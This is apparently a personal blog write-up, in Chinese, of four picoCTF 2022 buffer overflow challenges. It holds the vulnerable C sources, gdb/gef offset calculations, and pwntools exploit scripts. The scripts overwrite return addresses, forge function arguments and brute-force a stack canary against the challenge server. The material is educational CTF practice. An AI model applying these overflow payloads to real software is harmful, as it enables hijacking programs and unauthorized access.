---
title: picoCTF 2022 bof Writeup
date: 2025-04-10 19:30:06
updated: 2025-04-13 15:30:00
tags:
  - pwn
  - CTF
categories:
  - Cyber
  - CTF Writeup
cover: /img/picoCTF.png
top_img: /img/picoCTF.png
---

# buffer overflow 0
題目：https://play.picoctf.org/practice/challenge/257?page=1&search=buffer

> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 52445

既然他說是buffer overflow，我們就直接無腦灌一堆輸入
![image](https://hackmd.io/_uploads/r1gdqidA1x.png)
然後就莫名其妙的得到flag了

## why
好啦，我們還是好好來解XD
用wget把源碼跟執行檔抓下來
```c=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
從第31行可知當程式出現錯誤時會跑`sigsegv_handler`這個函式，此函式會把flag印出來

# buffer overflow 1
題目：https://play.picoctf.org/practice/challenge/258?page=1&search=buffer
> Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.
You can view source here.
And connect with it using nc saturn.picoctf.net 63054

用wget把源碼和執行檔抓下來，並給定vuln執行權限
```bash
chmod +x vuln
```

```c=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
為了在本地進行測試，我們先新增一個測試用的flag.txt
```
flag{testflag}
```
從程式碼可以看出我們若能呼叫`win`函式，他就會讀取flag.txt並把flag印出來，但要怎麼執行win函式呢？
答案是我們要用buffer overflow進行覆蓋，把return address改掉，要怎麼做呢？
> EIP暫存器指向即將執行的指令的位址

所以我們要將eip的值複寫為`win`函式的地址
使用gdb進行調適(註：要安裝gef或pwntools之類的plugin)
```bash
gdb ./vuln
```

反組譯vuln函式
```gdb
disassemble vuln
```
```gdb
Dump of assembler code for function vuln:
   0x08049281 <+0>:     endbr32
   0x08049285 <+4>:     push   ebp
   0x08049286 <+5>:     mov    ebp,esp
   0x08049288 <+7>:     push   ebx
   0x08049289 <+8>:     sub    esp,0x24
   0x0804928c <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049291 <+16>:    add    ebx,0x2d6f
   0x08049297 <+22>:    sub    esp,0xc
   0x0804929a <+25>:    lea    eax,[ebp-0x28]
   0x0804929d <+28>:    push   eax
   0x0804929e <+29>:    call   0x8049050 <gets@plt>
   0x080492a3 <+34>:    add    esp,0x10
   0x080492a6 <+37>:    call   0x804933e <get_return_address>
   0x080492ab <+42>:    sub    esp,0x8
   0x080492ae <+45>:    push   eax
   0x080492af <+46>:    lea    eax,[ebx-0x1f9c]
   0x080492b5 <+52>:    push   eax
   0x080492b6 <+53>:    call   0x8049040 <printf@plt>
   0x080492bb <+58>:    add    esp,0x10
   0x080492be <+61>:    nop
   0x080492bf <+62>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080492c2 <+65>:    leave
   0x080492c3 <+66>:    ret
End of assembler dump.
```

接著我們要用動態分析的方法取得offset (輸入到eip的距離，也就是需要先隨便填幾個字元之後才會達到eip的位置，以輸入win的地址)，有兩個方法
- 法一：手動算

在`get`函式(取得輸入)之後設定break point
```gdb
b *0x080492a3
```
把程式跑起來
```gdb
r
```
輸入短短幾個字
```
ABCDEF
```
用`search-pattern`找出輸入所在的位置
```gdb
search-pattern ABCDEF
```

```gef
gef➤  search-pattern ABCDEF
[+] Searching 'ABCDEF' in memory
[+] In '[heap]'(0x804d000-0x806f000), permission=rw-
  0x804d1a0 - 0x804d1a8  →   "ABCDEF\n" 
[+] In '/usr/lib32/libc.so.6'(0xf7f16000-0xf7f9b000), permission=r--
  0xf7f17021 - 0xf7f17058  →   "ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqr[...]" 
  0xf7f34a0c - 0xf7f34a43  →   "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx[...]" 
  0xf7f34aaa - 0xf7f34ac4  →   "ABCDEFGHIJKLMNOPQRSTUVWXYZ" 
  0xf7f34afa - 0xf7f34b1e  →   "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
  0xffffce10 - 0xffffce16  →   "ABCDEF" 
```

可以發現它在`0xffffce10`
接著用指令
```gdb
i f # info frame
```
```gdb
Stack level 0, frame at 0xffffce40:
 eip = 0x80492a3 in vuln; saved eip = 0x804932f
 called by frame at 0xffffce70
 Arglist at 0xffffce38, args: 
 Locals at 0xffffce38, Previous frame's sp is 0xffffce40
 Saved registers:
  ebx at 0xffffce34, ebp at 0xffffce38, eip at 0xffffce3c
```
發現eip在`0xffffce3c`的位置(看最後一行)
所以offset就是`0xffffce3c - 0xffffce10 = 44`

- 法二：電腦算

用指令
```gdb
pattern create 100
```
產生100bytes的測試字串
把程式跑起來後輸入
```gef
GNU gdb (Debian 16.2-8) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x41      
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x0       
$edx   : 0x0       
$esp   : 0xffffce40  →  "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32 
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce40│+0x0000: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"    ← $esp
0xffffce44│+0x0004: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffce48│+0x0008: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffce4c│+0x000c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffce50│+0x0010: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffce54│+0x0014: "raaasaaataaauaaavaaawaaaxaaayaaa"
0xffffce58│+0x0018: "saaataaauaaavaaawaaaxaaayaaa"
0xffffce5c│+0x001c: "taaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
可以看到目前eip的值是`0x6161616c`(laaa)，我們輸入
```gdb
pattern offset 0x6161616c
```
```gef
gef➤  pattern offset 0x6161616c
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```
直接得知offset為`44`

接著我們需要知道`win`函式的位置
使用指令
```gdb
x win
```
```gdb
0x80491f6 <win>:        0xfb1e0ff3
```
得到`win`在`0x80491f6`

使用pwntools的p32函式可將數字轉換為字符(採用Little-Endian)
```python
Python 3.13.2 (main, Mar 13 2025, 14:29:07) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x80491f6)
b'\xf6\x91\x04\x08'
```
因此我們需要輸入44個A後接上\xf6\x91\x04\x08
也就是`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08`
但我們不能直接輸入，要用
- 法一
```bash
# local
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln
# remote
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 63054
```
- 法二：使用pwntools解題
新增 `payload.py`
內容如下
```python
#!/usr/bin/python3

from pwn import *

server = "saturn.picoctf.net"
port = 63054
binaryfile = "./vuln"

# open file

if args.REMOTE:
    p = remote(server, port)
else:
    p = process(binaryfile)

# payload

offset = 44
win = 0x80491f6

payload = b'A'*offset
payload += p32(win)

print(p.recvuntil(b':').decode('utf-8'))
p.sendline(payload) # send the payload
p.interactive()
```

```bash
# local
python3 payload.py
# remote
python3 payload.py REMOTE
```
成功！
![image](https://hackmd.io/_uploads/r1SmERdRkg.png)


# buffer overflow 2
題目：https://play.picoctf.org/practice/challenge/259?page=1&search=buffer
> Control the return address and arguments
This time you'll need to control the arguments to the function you return to! Can you get the flag from this program?
You can view source here.
And connect with it using nc saturn.picoctf.net 62549

(由於大部分技巧前面都講過了，以下兩題會跳過細節只講關鍵部分)
這題我們不只需要改return address，還要把win函數的參數一併修改
在gdb中反組譯win函式，可發現這四行組語
```gdb
   0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 <+125>:   jne    0x804932f <win+153>
   0x08049315 <+127>:   cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c <+134>:   jne    0x8049332 <win+156>
```
代表他會把`ebp+0x8`的值拿去跟`0xcafef00d`比較；`ebp+0xc`的值跟`0xf00df00d`比較，都一樣才會對
可以參考[這篇文章](https://zhu45.org/posts/2017/Jul/30/understanding-how-function-call-works/)，就知道這兩個位置其實就是win函數的兩個參數。
也就是我們覆蓋掉eip達到win函數之後，還要進一步將這兩處改成我們需要的值。
首先用先前提的方法求出到eip的offset(這裡用`pattern create 100` 還填不滿buffer，所以塞多一點，比如`pattern create 200`)
這裡介紹一個不一樣的輸入方法
```gdb
r <<< $(echo aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab)
```
能直接把那一串東西輸入進去。
可以得到offset應為`112`
用`x win`可以得到`win`的位置為`0x8049296`

所以輸入
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```
理論上可以進到`win`
測試一下，在`win`新增一個break point (`b win`)
接著跑起來
```gdb
r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08")
```
我們可以看到這行
```gef
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x804929e in win (), reason: BREAKPOINT
```
代表我們成功跳到`win`了
我們在payload後面再次加上pattern create產生的內容再跑一次
```gdb
r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
```
達到win之後，我們使用
```gdb
x/x $ebp+0x8
```
查詢`ebp+0x8`處的內容，得到
```gdb
0xffffce44:     0x61616162
```
求出offset
```gdb
pattern offset 0x61616162
```
```gef
gef➤  pattern offset 0x61616162
[+] Searching for '62616161'/'61616162' with period=4
[+] Found at offset 4 (little-endian search) likely
```
得知offset為4，也就是在達到win之後，我們還需要額外塞4個字元，再輸入我們希望設定的ebp+0x8的值。
而填入`0xcafef00d`之後，由於`0xcafef00d`剛好是4個bytes，所以便到了ebp+0xc，直接接著填`0xf00df00d`就好

## 撰寫payload
```python
#!/usr/bin/python3

from pwn import *

server = "saturn.picoctf.net"
port = 62549
binaryfile = "./vuln"

# open file

if args.REMOTE:
    print('remote')
    p = remote(server, port)
else:
    p = process(binaryfile)

# payload

offset1 = 112
offset2 = 4
win = 0x08049296

payload = b'A'*offset1
payload += p32(win)
payload += b'B'*offset2
payload += p32(0xcafef00d)
payload += p32(0xf00df00d)

print(p.recvuntil(b':').decode('utf-8'))
p.sendline(payload) # send the payload
p.interactive()
```
![image](https://hackmd.io/_uploads/BkP2jCdAJg.png)


# buffer overflow 3
題目：https://play.picoctf.org/practice/challenge/260?page=1&search=buffer
> Do you think you can bypass the protection and get the flag?
It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows. You can view source here. And connect with it using:
nc saturn.picoctf.net 51815

> 理論上canary要是一個隨機值，繞過方法通常是利用其他漏洞是先取得其值，在寫到它時原封不動的寫回去，所以本題比較不符合真實情境

看原始碼了解程式的邏輯是自己訂一個固定的4bytes的canary，因此先新增一個canary.txt，裡面填入4bytes的內容，比如`RgSh`

我們可以在vuln.c中看到buffer的大小為64bytes，而經由實測發現輸入第65個字元之後就會報
```
***** Stack Smashing Detected ***** : Canary Value Corrupt!
```
的錯誤。

此題的關鍵是如果我們輸入第65個字還沒報錯，就代表我們猜對了canary的第一個字元，輸入第66個還沒報錯代表canary的前兩個字元都猜對，以此類推，並用此邏輯去爆破canary。

## payload
```python
#!/usr/bin/python3

from pwn import *
import string

server = "saturn.picoctf.net"
port = 51815
binaryfile = "./vuln"

# open file

if args.REMOTE:
    r = True
else:
    r = False

# payload

offset1 = 64 # buffer size (the distance between the input and the canary's location)
offset2 = 16 # eip - the address of the canary - 0x4 (the size of the canary)
win = 0x8049336

def canary_brute_force():
    canary = b''
    for i in range(1,5):
        for c in string.printable:
            if r:
                p = remote(server, port)
            else:
                p = process(binaryfile)
            p.sendlineafter(b'> ', b'%d' % (offset1 + i)) # the length of the payload (A*64 + first i character of the canary)

            payload = b'A'*offset1 + canary
            payload += c.encode()
            p.sendlineafter(b'> ', payload)

            if b"Now Where's the Flag" in p.recvall(): # if no Stack Smashing Detected
                canary += c.encode()
                break
            p.close()
    print('\nThe canary is:', canary.decode(), '\n')
    return canary

payload = b'A'*offset1
payload += canary_brute_force()
payload += b'B'*offset2
payload += p32(win)

if r:
    p = remote(server, port)
else:
    p = process(binaryfile)

print(p.recvuntil(b'>').decode('utf-8'))
p.sendline(b'%d' % (len(payload)))
print(p.recvuntil(b'> ').decode('utf-8'))
p.sendline(payload) # send the payload
p.interactive()

```

跑了好久終於跑出結果
![image](https://hackmd.io/_uploads/S1n5IyYC1g.png)


這些東西對於初學的我花了好多時間，參考資料基本上google到的前一兩頁的writeups我都看了，還有CTFtime上面的。
